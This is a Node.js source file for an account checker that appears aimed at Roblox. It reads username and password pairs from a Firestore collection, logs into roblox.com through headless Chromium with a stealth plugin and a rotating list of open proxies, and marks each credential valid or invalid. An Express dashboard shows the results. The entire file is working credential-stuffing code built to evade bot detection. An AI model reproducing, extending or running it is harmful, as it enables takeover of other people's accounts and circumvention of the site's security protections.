const fs = require('fs');
const admin = require('firebase-admin');
const { chromium } = require('playwright-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const express = require('express');
const cors = require('cors');
const path = require('path');
const glob = require('glob');

// Use Stealth Plugin with Playwright
chromium.use(StealthPlugin());

// 🔥 Firebase Setup
let serviceAccount;
try {
  if (process.env.FIREBASE_CONFIG) {
    serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
  } else {
    serviceAccount = require('./oren-devs-firebase-adminsdk.json');
  }
} catch (error) {
  console.error('❌ Firebase config not found!');
  process.exit(1);
}

admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const URL = 'https://roblox.com/login';

// ⚡ Global State
let stats = { 
  processed: 0, 
  valid: 0, 
  invalid: 0, 
  queue: 0, 
  processing: 0,
  uptime: Date.now(),
  system_health: {
    tier_found: 0,
    browser_path: 'Searching for Playwright...',
    last_error: null,
    engine: 'Playwright (Chromium)'
  }
};
let processingQueue = [];
let activeBrowsers = 0;
const MAX_CONCURRENT = 2;

// 🛡️ Proxy List
const proxies = [
  'http://20.210.113.32:80',
  'http://154.16.63.190:80',
  'http://67.43.228.253:25803',
  'http://103.153.154.6:80',
  'http://47.74.152.29:8888'
];

function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

/**
 * 🛡️ ULTRA-ROBUST 10-TIER PLAYWRIGHT CHROMIUM FAILOVER SYSTEM
 */
function findPlaywrightChromium() {
  const possiblePaths = [
    // Tier 1: User-defined override
    process.env.PLAYWRIGHT_EXECUTABLE_PATH,

    // Tier 2: Playwright default cache on Render
    path.join(process.env.HOME || '/home/render', '.cache/ms-playwright/chromium-*/chrome-linux/chrome'),
    
    // Tier 3: Local project cache
    path.join(process.cwd(), '.cache/ms-playwright/chromium-*/chrome-linux/chrome'),

    // Tier 4: Global Playwright cache
    '/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome',

    // Tier 5: Standard system Google Chrome
    '/usr/bin/google-chrome-stable',

    // Tier 6: Standard system Chromium
    '/usr/bin/chromium-browser',

    // Tier 7: Generic Linux Binary Paths
    '/usr/bin/google-chrome',
    '/usr/bin/chromium',

    // Tier 8: Render's shared cache
    '/opt/render/.cache/ms-playwright/chromium-*/chrome-linux/chrome',

    // Tier 9: Project node_modules (legacy/fallback)
    path.join(process.cwd(), 'node_modules/playwright-core/.local-browsers/chromium-*/chrome-linux/chrome'),

    // Tier 10: Playwright Auto-Discovery (Final attempt)
    'PLAYWRIGHT_AUTO'
  ];

  for (let i = 0; i < possiblePaths.length; i++) {
    const p = possiblePaths[i];
    if (!p) continue;

    if (p === 'PLAYWRIGHT_AUTO') {
      stats.system_health.tier_found = 10;
      stats.system_health.browser_path = 'Playwright Default Discovery';
      return null; // Playwright will find it automatically
    }

    try {
      const matches = glob.sync(p);
      if (matches && matches.length > 0) {
        stats.system_health.tier_found = i + 1;
        stats.system_health.browser_path = matches[0];
        return matches[0];
      }
    } catch (e) {}
  }
  return null;
}

const EXECUTABLE_PATH = findPlaywrightChromium();

/**
 * 🛡️ Robust Browser Launch Wrapper for Playwright
 */
async function launchBrowserResiliently() {
  const launchOptions = {
    headless: true,
    args: [
      '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
      '--disable-gpu', '--no-zygote', '--single-process'
    ],
    proxy: { server: getRandomProxy() }
  };

  if (EXECUTABLE_PATH && EXECUTABLE_PATH !== 'Playwright Default Discovery') {
    launchOptions.executablePath = EXECUTABLE_PATH;
  }

  try {
    return await chromium.launch(launchOptions);
  } catch (err) {
    stats.system_health.last_error = `Tiered launch failed: ${err.message}`;
    // Final emergency fallback: launch with zero custom options
    return await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  }
}

async function validateCredential(credential) {
  let browser = null;
  try {
    stats.processing++;
    browser = await launchBrowserResiliently();
    activeBrowsers++;
    
    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    });
    
    const page = await context.newPage();

    // Resource Blocking for Speed
    await page.route('**/*.{png,jpg,jpeg,gif,svg,css,woff,woff2,ttf,otf}', route => route.abort());

    await page.goto(URL, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForSelector('#login-username', { timeout: 15000 });

    await page.fill('#login-username', credential.username);
    await page.fill('#login-password', credential.password);
    
    await Promise.all([
      page.click('button[type="submit"]'),
      page.waitForNavigation({ waitUntil: 'networkidle', timeout: 15000 }).catch(() => {})
    ]);

    // Check for success: Nav-settings only appears for logged-in users
    const hasSettings = await page.$('span#nav-settings');
    const result = hasSettings ? 'valid' : 'invalid';

    await db.collection('credentials').doc(credential.id).update({
      status: result,
      processed_at: admin.firestore.FieldValue.serverTimestamp()
    });

    if (result === 'valid') {
      stats.valid++;
      console.log(`✅ VALID: ${credential.username}`);
    } else {
      stats.invalid++;
      console.log(`❌ INVALID: ${credential.username}`);
    }

    return result;

  } catch (error) {
    stats.system_health.last_error = error.message;
    console.error(`⚠️ ${credential.username} Error: ${error.message}`);
    await db.collection('credentials').doc(credential.id).update({
      status: 'invalid',
      error: error.message.substring(0, 200),
      processed_at: admin.firestore.FieldValue.serverTimestamp()
    }).catch(() => {});
    stats.invalid++;
    return 'invalid';
  } finally {
    if (browser) {
      await browser.close().catch(() => {});
      activeBrowsers--;
    }
    stats.processing--;
  }
}

async function processQueue() {
  if (activeBrowsers >= MAX_CONCURRENT || processingQueue.length === 0) return;
  const credential = processingQueue.shift();
  stats.queue = processingQueue.length;
  stats.processed++;
  await validateCredential(credential);
}

async function scanAndQueue() {
  try {
    const snapshot = await db.collection('credentials')
      .where('status', '==', 'pending')
      .limit(5)
      .get();

    if (!snapshot.empty) {
      snapshot.docs.forEach(doc => {
        const data = doc.data();
        data.id = doc.id;
        if (!processingQueue.find(q => q.id === data.id)) {
          processingQueue.push(data);
        }
      });
      stats.queue = processingQueue.length;
    }
  } catch (error) {
    stats.system_health.last_error = error.message;
  }
}

async function queueProcessor() {
  while (true) {
    await processQueue();
    await new Promise(r => setTimeout(r, 1000));
  }
}

setInterval(scanAndQueue, 10000);

// --- API Endpoints ---
app.get('/api/stats', (req, res) => {
  res.json({
    ...stats,
    uptime_human: Math.floor((Date.now() - stats.uptime) / 1000) + 's',
    server_time: new Date().toISOString()
  });
});

app.get('/api/recent', async (req, res) => {
  try {
    const snapshot = await db.collection('credentials').orderBy('processed_at', 'desc').limit(10).get();
    res.json(snapshot.docs.map(d => ({ id: d.id, ...d.data() })));
  } catch (e) { res.json([]); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Playwright Validator on port ${PORT}`);
  scanAndQueue();
  queueProcessor().catch(console.error);
});
